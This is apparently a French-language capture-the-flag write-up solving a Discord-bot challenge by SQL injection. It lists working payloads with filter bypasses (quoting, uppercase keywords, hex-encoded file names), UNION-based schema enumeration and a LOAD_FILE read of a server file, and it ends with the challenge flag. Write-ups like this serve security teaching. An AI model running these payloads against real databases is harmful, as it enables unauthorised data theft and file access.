# Hacker Bot 🤖🔍
```
1000 pts
```

## Description
```
[FR]
Ne laisse nulle part où la main ne passe et ne repasse, fouille et refouille. Va et discute avec le bot hacker_bot#4249 en dm et ramène-nous ce fameux trésor qu'il cache.

[EN]
Leaves nowhere where the hand does not pass and iron, search and re-search. Go and chat with the bot hacker_bot#4249 in dm and bring us back this famous treasure he is hiding.
```

> Ce challenge nous demande de discuter avec un bot. En voyant le nom du bot, nous avons déduit qu'il s'agissait d'un bot Discord. La première chose à faire était de lui envoyer un message privé. En regardant dans le channel Discord, nous avons retrouvé le moment où le bot a été ajouté, nous pouvions alors lui envoyer un message.

<image src="../Web/File/bot1.png">
  
> On essaie de lui envoyer un message pour voir comment il réagit. Le bot répond en nous demandant d'utiliser *!help* pour avoir la liste des commandes.

<image src="../Web/File/bot2.png">

> En utilisant la commande *!help*, on remarque que le bot ne prend qu'une seule commande supplémentaire, qui est la commande *!auth*, permettant de s'authentifier en tant qu'admin.

<image src="../Web/File/bot3.png">

> On a donc décidé d'envoyer un simple password à *!auth* pour voir le comportement du bot. On obtient comme réponse *Error: Minuscule hacker, filters catch you.*

> Des filtres sont donc mis sur l'input de l'utilisateur, ce qui nous a fait penser à de l'injection SQL, puisqu'il s'agit d'un système d'authentification.

>On a donc envoyé un simple payload ```!auth admin' or 1=1#```, mais on obtient comme erreur *Error: You provide more than One password*.

> Notre payload ne doit donc pas contenir des espaces puisque le bot n'accepte pas plus d'un password.
> Nous avons trouvé un moyen astucieux de contourner ce filtre sur les espaces en passant notre payload comme un string en utilisant ""🙂.
 
> Notre payload devient alors ```!auth "admin' or 1=1#"```, mais on obtient toujours une erreur *Error: Minuscule hacker, filters catch you*.🙁
> On a donc déduit que les commandes SQL étaient filtrées. Nous avons alors décidé d'utiliser *OR* à la place de *or* en utilisant *!auth admin' OR 1=1#*.

> En faisant cela, on obtient un autre type d'erreur *Error: More than one password found for admin, Is impossible*, ce qui veut dire que le payload est passé mais a renvoyé plus d'une ligne. On a donc utilisé LIMIT pour afficher la première ligne. ```!auth "admin' OR 1=1 LIMIT 1#"```

 <image src="../Web/File/bot4.png">

 > 😎 On arrive à obtenir une sortie des informations d'un utilisateur. Nous allons maintenant utiliser OFFSET pour afficher les lignes qui suivent. ```!auth "admin' OR 1=1 LIMIT 1 OFFSET 1#"```.

<image src="../Web/File/bot5.png">
  
> 🥳 Bingo ! On obtient les informations sur l'admin ainsi que son mot de passe. Le mot de passe semblait être encodé, nous avons donc décidé d'utiliser CyberChef pour le décoder.

<image src="../Web/File/bot6.png">

> 😅 Il ne s'agit pas du flag, c'est juste un message qui dit que le flag n'est pas dans cette base de données. Il faut alors chercher dans les bases de données pour trouver le bon flag.

> On est alors parti sur l'attaque par l'union pour dumper les informations de la base de données.

> La première étape de l'attaque par l'union est de déterminer le nombre de colonnes que renvoie la première requête SQL. Après avoir cherché à partir du nombre 1 de colonne. ```!auth "'UNION SELECT 1#"```, ```!auth "'UNION SELECT 1,2#"```, ```!auth "'UNION SELECT 1,2,3#"```, ```!auth "'UNION SELECT 1,2,3,4#"```

<image src="../Web/File/bot7.png">

> Nous avons finalement trouvé le nombre de colonnes que renvoyait la requête. (5 colonnes)

<image src="../Web/File/bot8.png">

> La deuxième étape est de déterminer la base de donnée dans laquelle on se trouve. ```!auth "'UNION SELECT 1,DATABASE(),3,4,5#"```

<image src="../Web/File/bot9.png">
  
> Le faux flag nous faisait comprendre que le flag ne se trouvait pas dans cette base de données. Nous avons utilisé INFORMATION_SCHEMA pour déterminer les noms des autres bases de données. ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1#"```

<image src="../Web/File/bot10.png">

> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 1#"```

<image src="../Web/File/bot11.png">
  
> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 4#"```

<image src="../Web/File/bot12.png">
  
> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 5#"```

<image src="../Web/File/bot13.png">
  
> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 6#"```

<image src="../Web/File/bot14.png">
  
> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 7#"```

<image src="../Web/File/bot15.png">

> ```!auth "'UNION SELECT 1,SCHEMA_NAME,2,3,4 FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET 8#"```

<image src="../Web/File/bot16.png">

> On arrive à trouver toutes les autres bases de données *flag2*, *flag4*, *flag6*, *flag8*. L'objectif maintenant est de chercher dans ces différentes bases de données le flag. L'étape suivante est de chercher les différentes tables de ces bases de données. ```!auth "'UNION SELECT 1,TABLE_NAME,2,3,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='flag2'#"```

<image src="../Web/File/bot17.png">
  
> Chacune des bases de données *flagx* contient une seule table, la table *fake_flag*. Nous avons ensuite cherché les colonnes de chacune de ces tables. ```*!auth "'UNION SELECT 1,COLUMN_NAME,2,3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='flag2' AND TABLE_NAME='fake_flag' LIMIT 1#"```

<image src="../Web/File/bot21.png">
  
```!auth "'UNION SELECT 1,COLUMN_NAME,2,3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='flag2' AND TABLE_NAME='fake_flag' LIMIT 1 OFFSET1#"```

<image src="../Web/File/bot22.png">

> La table *fake_flag* contient deux colonnes, la colonne *id* et *flag*. Nous avons donc une structure des tables et colonnes des base de données *flagx*.

> Par la suite, nous avons affiché les différentes informations des colonnes.
```!auth "'UNION SELECT 1,flag,2,3,4 FROM flag2.fake_flag#"```

<image src="../Web/File/bot23.png">
  
> La base de donnée *flag2* ne nous donne rien 😢, on continue. ```!auth "'UNION SELECT 1,flag,2,3,4 FROM flag4.fake_flag#"```

<image src="../Web/File/bot24.png">

> La base de donnée *flag4* nous dit que le flag n'est dans aucune base de donnée 😩.
```!auth "'UNION SELECT 1,flag,2,3,4 FROM flag6.fake_flag#"```

<image src="../Web/File/bot25.png">

> La base de donnée *flag6* nous dit que le flag est caché sur le système.
```!auth "'UNION SELECT 1,flag,2,3,4 FROM flag6.fake_flag#"```

<image src="../Web/File/bot26.png">

> La base de donnée *flag8* nous donne le nom du fichier du flag *.flaaag* sur le système 😮‍💨.
> Il nous faut lire le fichier flag sur le système. La fonction SQL *LOAD_FILE()* permet de lire des fichiers.
```!auth "'UNION SELECT 1,LOAD_FILE('.flaaag'),2,3,4#"```

<image src="../Web/File/bot27.png">

> 🤣 Le nom flaaag est filtré. Nous avons trouvé un moyen de contourner ce filtre en encodant le nom en hexadécimal.
```!auth "'UNION SELECT 1,LOAD_FILE(0x2e666c61616167),2,3,4#"```

<image src="../Web/File/bot28.png">

> 😫 Toujours rien. On a finalement compris qu'il fallait chercher dans un répertoire spécifique.

> Après quelques recherches, nous avons trouvé la variable *@@secure_file_priv* qui détermine le répertoire où l'utilisateur MySQL peut enregistrer des fichiers. On affiche par la suite cette variable pour voir où se trouve le fichier flag.
```!auth "'UNION SELECT 1,@@secure_file_priv,2,3,4#"```

<image src="../Web/File/bot29.png">

> Nous avons encodé tout le chemin absolu du flag */var/lib/mysql-files/.flaaag* en hexadécimal.

<image src="../Web/File/bot30.png">
  
> On obtient finalement le flag 🥳😎.

# FLAG

```CTF_O0o0o0uups5sSSs5sS5s_my_bO7_Wu1Ner@bL3_7O_5q1_Inj3ct!oN_4nd_YoU_r34d_My_fl@g_heheheh```
